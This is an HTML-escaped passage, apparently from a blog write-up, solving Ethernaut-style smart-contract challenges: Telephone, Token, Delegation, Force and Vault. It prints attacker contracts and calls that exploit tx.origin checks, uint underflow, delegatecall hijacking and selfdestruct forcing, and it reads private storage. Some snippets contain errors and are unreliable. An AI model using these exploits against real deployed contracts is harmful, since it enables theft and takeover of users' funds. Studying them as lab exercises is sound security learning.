&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  constructor() {
&lt;&#x2F;span&gt;&lt;span&gt;    owner &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;changeOwner&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;_owner) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    if (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;tx&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;origin != msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;      owner &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; _owner;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;For claiming ownership of the contract, just need to make the values of &lt;code&gt;tx.origin&lt;&#x2F;code&gt; and &lt;code&gt;msg.sender&lt;&#x2F;code&gt; unequal. Reference to https:&#x2F;&#x2F;docs.soliditylang.org&#x2F;en&#x2F;v0.8.21&#x2F;cheatsheet.html#block-and-transaction-properties, &lt;code&gt;msg.sender&lt;&#x2F;code&gt; would return address of sender of the message (current call) while &lt;code&gt;tx.origin&lt;&#x2F;code&gt; return the address of sender of the transaction (full call chain), which mean the &lt;code&gt;tx.origin&lt;&#x2F;code&gt; must be a &lt;code&gt;Externally Owned Account&lt;&#x2F;code&gt; and &lt;code&gt;msg.sender&lt;&#x2F;code&gt; could be a &lt;code&gt;contract account&lt;&#x2F;code&gt; used for indirect calls.&lt;&#x2F;p&gt;
&lt;p&gt;Just deploy a contract for indirectly calling would satisfied the requirements.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.8.0&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;#39;.&#x2F;Telephone.sol&amp;#39;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Attacker &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;  Telephone _telephone;
&lt;&#x2F;span&gt;&lt;span&gt;  constructor(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;_address) {
&lt;&#x2F;span&gt;&lt;span&gt;    _telephone &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Telephone&lt;&#x2F;span&gt;&lt;span&gt;(_address);
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;IndirectlyCall&lt;&#x2F;span&gt;&lt;span&gt;() {
&lt;&#x2F;span&gt;&lt;span&gt;    _telephone.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;changeOwner&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;token&quot;&gt;Token&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.6.0&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Token &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  mapping(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;=&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt;) balances;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint public&lt;&#x2F;span&gt;&lt;span&gt; totalSupply;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  constructor(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint &lt;&#x2F;span&gt;&lt;span&gt;_initialSupply) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    balances[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; totalSupply &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; _initialSupply;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;transfer&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;_to, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint &lt;&#x2F;span&gt;&lt;span&gt;_value) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;returns (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;    require(balances[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt; _value &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;    balances[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-=&lt;&#x2F;span&gt;&lt;span&gt; _value;
&lt;&#x2F;span&gt;&lt;span&gt;    balances[_to] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+=&lt;&#x2F;span&gt;&lt;span&gt; _value;
&lt;&#x2F;span&gt;&lt;span&gt;    return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;true&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;_owner) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public view &lt;&#x2F;span&gt;&lt;span&gt;returns (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt; balance) {
&lt;&#x2F;span&gt;&lt;span&gt;    return balances[_owner];
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Easily noticed that the requirement &lt;code&gt;balances[msg.sender] - _value &amp;gt;= 0&lt;&#x2F;code&gt; doesn’t use SafeMath.sol, leading to overflow vulnerability. It is because &lt;code&gt;balances[msg.sender]&lt;&#x2F;code&gt; and &lt;code&gt;_value&lt;&#x2F;code&gt; was all declared as &lt;code&gt;uint&lt;&#x2F;code&gt;, and the result of the calculation will still be uint.&lt;&#x2F;p&gt;
&lt;p&gt;To solve this challenge, we need another account to call the transfer. Because both EOA and CA are applicable, just modify the Attacker contract in the former challenge &lt;code&gt;Telephone&lt;&#x2F;code&gt;, this challenge can be solved.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.8.0&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;#39;.&#x2F;Token.sol&amp;#39;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Attacker &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;  Token _token;
&lt;&#x2F;span&gt;&lt;span&gt;  constructor(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;_address) {
&lt;&#x2F;span&gt;&lt;span&gt;    _token &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Token&lt;&#x2F;span&gt;&lt;span&gt;(_address);
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;IndirectlyCall&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;_address) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    _token.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;transfer&lt;&#x2F;span&gt;&lt;span&gt;(_address, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;10000020&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;delegation&quot;&gt;Delegation&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.8.0&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Delegate &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address public&lt;&#x2F;span&gt;&lt;span&gt; owner;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  constructor(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;_owner) {
&lt;&#x2F;span&gt;&lt;span&gt;    owner &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; _owner;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;pwn&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    owner &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Delegation &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address public&lt;&#x2F;span&gt;&lt;span&gt; owner;
&lt;&#x2F;span&gt;&lt;span&gt;  Delegate delegate;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  constructor(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;_delegateAddress) {
&lt;&#x2F;span&gt;&lt;span&gt;    delegate &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Delegate&lt;&#x2F;span&gt;&lt;span&gt;(_delegateAddress);
&lt;&#x2F;span&gt;&lt;span&gt;    owner &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  fallback() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt; result,) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= address&lt;&#x2F;span&gt;&lt;span&gt;(delegate).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;delegatecall&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;data&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;    if (result) {
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The target is to claim ownership of the contract instance. &lt;a href=&quot;https:&#x2F;&#x2F;solidity-by-example.org&#x2F;delegatecall&#x2F;&quot;&gt;delegatecall&lt;&#x2F;a&gt; is low level function similar to &lt;code&gt;call&lt;&#x2F;code&gt;. but in the process of &lt;code&gt;delegatecall&lt;&#x2F;code&gt; , the function being called indirectly would using the calling function’s memory and &lt;code&gt;msg.sender&lt;&#x2F;code&gt; &lt;code&gt;msg.value&lt;&#x2F;code&gt;. Therefore delegates have complete access to your contract’s state. Referrence to https:&#x2F;&#x2F;www.wtf.academy&#x2F;en&#x2F;solidity-advanced&#x2F;Delegatecall&#x2F;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;contract.sendTransaction({data: web3.utils.keccak256(&amp;quot;pwn()&amp;quot;)})
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;force&quot;&gt;Force&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.8.0&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Force &lt;&#x2F;span&gt;&lt;span&gt;{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;*
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;                   MEOW ?
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;         &#x2F;\_&#x2F;\   &#x2F;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;    ____&#x2F; o o \
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;  &#x2F;~____  =ø= &#x2F;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt; (______)__m_m)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;*&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;It just a plain contract with none code inside. Even not have a &lt;code&gt;receive&lt;&#x2F;code&gt; or &lt;code&gt;fallback&lt;&#x2F;code&gt; function to recept money.&lt;&#x2F;p&gt;
&lt;p&gt;Contracts can get money through the following methods:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;payable function ( customize &#x2F; receive &#x2F; fallback ) and external calling&lt;&#x2F;li&gt;
&lt;li&gt;selfdestruct award&lt;&#x2F;li&gt;
&lt;li&gt;mining award&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Apparently in this contract we should call &lt;a href=&quot;https:&#x2F;&#x2F;docs.soliditylang.org&#x2F;en&#x2F;v0.8.20&#x2F;introduction-to-smart-contracts.html#deactivate-and-self-destruct&quot;&gt;selfdestruct&lt;&#x2F;a&gt; of other contract to force this contract recept money.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.8.0&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Sacrifice &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;suicide&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address payable &lt;&#x2F;span&gt;&lt;span&gt;_address) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external payable &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;selfdestruct&lt;&#x2F;span&gt;&lt;span&gt;(_address);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    receive() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external payable &lt;&#x2F;span&gt;&lt;span&gt;{ }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;deploy and call suicide function with value &lt;code&gt;10000 wei&lt;&#x2F;code&gt; would solve this challenge&lt;&#x2F;p&gt;
&lt;h2 id=&quot;vault&quot;&gt;Vault&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.8.0&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Vault &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bool public&lt;&#x2F;span&gt;&lt;span&gt; locked;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes32 private&lt;&#x2F;span&gt;&lt;span&gt; password;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  constructor(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes32 &lt;&#x2F;span&gt;&lt;span&gt;_password) {
&lt;&#x2F;span&gt;&lt;span&gt;    locked &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= true&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    password &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; _password;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;unlock&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes32 &lt;&#x2F;span&gt;&lt;span&gt;_password) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    if (password &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;==&lt;&#x2F;span&gt;&lt;span&gt; _password) {
&lt;&#x2F;span&gt;&lt;span&gt;      locked &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= false&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Just get the value of password would solve this challenge. Even though  password is declared as private, there is no real private variable in blockchain world. We are able to directly visit the memory of contract. Through easy calculation you would know the password is in the solt with index 1.&lt;&#x2F;p&gt;
